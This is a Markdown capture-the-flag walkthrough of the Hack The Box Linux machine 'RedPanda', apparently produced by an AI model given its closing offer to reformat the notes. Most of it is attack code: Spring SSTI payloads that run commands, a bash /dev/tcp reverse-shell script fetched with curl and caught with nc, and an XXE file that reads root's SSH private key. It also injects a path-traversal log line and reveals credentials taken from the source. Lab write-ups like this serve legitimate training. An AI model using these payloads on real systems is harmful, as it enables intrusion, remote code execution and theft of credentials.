## 📌 Box Info
- **OS**: [Linux](Linux)
- **Difficulty**: [Easy](Easy)
- Platform: [HTB](HTB)

## 🔍 Recon

### Nmap Full Scan
```bash
nmap -p- --min-rate 10000 10.10.11.170
nmap -p 22,8080 -sCV 10.10.11.170
```

### Add to Hosts File
```bash
echo "10.10.11.170 redpanda.htb" | sudo tee -a /etc/hosts
```

### [Feroxbuster](HTTP.md) for Paths
```bash
feroxbuster -u http://10.10.11.170:8080 -x java,class
```

---

## 🧠 SSTI Foothold

### Fuzz for Banned Characters
```bash
wfuzz -u http://10.10.11.170:8080/search -d name=FUZZ \
-w /usr/share/seclists/Fuzzing/alphanum-case-extra.txt --ss banned
```

### Valid Payload Examples
```text
*{7*7}
@{7*7}
#{7*7}
```

### RCE via SSTI (in search box)
```text
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
```

---

## 🐚 Reverse Shell (via SSTI)

### Reverse Shell Payload Script (host locally)
```bash
# /var/www/html/shell.sh
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.6/443 0>&1
```

### Drop the shell
```http
*{T(java.lang.Runtime).getRuntime().exec('curl 10.10.14.6/shell.sh -o /tmp/shell.sh')}
*{T(java.lang.Runtime).getRuntime().exec('bash /tmp/shell.sh')}
```

### Catch Reverse Shell
```bash
nc -lvnp 443
script /dev/null -c bash  # for upgrade
```

---

## 🔐 Enumeration

### Confirm Group for PrivEsc Path
```bash
id
```

### Check Files Owned by `logs` Group
```bash
find / -group logs 2>/dev/null | grep -v -e '^/proc' -e '\.m2' -e '^/tmp/'
```

---

## 🔍 Analyze Applications

### Interesting Paths
```bash
/opt/panda_search/
/opt/credit-score/
/credits/
/opt/panda_search/redpanda.log
```

### Note: Web creds (from source)
```bash
user: woodenk
pass: RedPandazRule
```

---

## ⚙️ Root Shell via XXE Chain

### 1. Create Malicious XML (`0xdf_creds.xml`)
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY foo SYSTEM 'file:///root/.ssh/id_rsa'>
]>
<credits>
  <author>0xdf</author>
  <image>
    <uri>/img/panda.jpg</uri>
    <views>0</views>
    <root>&foo;</root>
  </image>
  <totalviews>1</totalviews>
</credits>
```

### 2. Tag Image with Metadata (JPG Artist Field)
```bash
cp image.jpg 0xdf.jpg
exiftool -Artist="../tmp/0xdf" 0xdf.jpg
```

### 3. Upload Malicious Files to `/tmp/`
```bash
scp 0xdf.jpg 0xdf_creds.xml woodenk@10.10.11.170:/tmp/
```

### 4. Inject Fake Log Line
```bash
echo "412||ip||ua||/../../../../../../tmp/0xdf.jpg" >> /opt/panda_search/redpanda.log
```

### 5. Wait for Cronjob (~2 mins)

### 6. Extract SSH Key from XML
```bash
cat /tmp/0xdf_creds.xml
```

---

## 🗝️ [SSH](SSH) as Root

### Save and Use Key
```bash
chmod 600 ~/keys/redpanda-root
ssh -i ~/keys/redpanda-root root@10.10.11.170
```

---

## 🎓 Beyond Root: Group Discrepancy

### Web Shell (via SSTI)
```bash
id  # groups: logs, woodenk
```

### SSH Login
```bash
id  # groups: woodenk
```

### Reason
- Java web app started as:
  ```bash
  sudo -u woodenk -g logs java -jar ...
  ```
- SSTI shell inherits logs group
- SSH session doesn’t

---

Let me know if you'd like this wrapped into a Markdown file or Notion-friendly version! 🧩